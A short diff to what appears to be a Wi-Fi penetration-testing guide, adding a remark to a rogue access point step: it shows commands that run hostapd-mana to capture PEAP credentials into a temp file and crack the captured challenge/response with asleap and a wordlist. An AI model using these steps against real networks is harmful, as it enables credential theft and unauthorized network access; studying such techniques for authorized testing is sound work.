@@ -250,6 +250,9 @@ nano /etc/hostapd-mana/mana.eap_user
 ```
 sudo hostapd-mana /etc/hostapd-mana/mana.conf
 ```
+**Remark**
+- method 25 = PEAP
+- Credentials store in `/tmp/hostapd.credout`
 12. Crack the password
 ```
 asleap -C <challengekey> -R <responsekey> -W /usr/share/john/password.lst
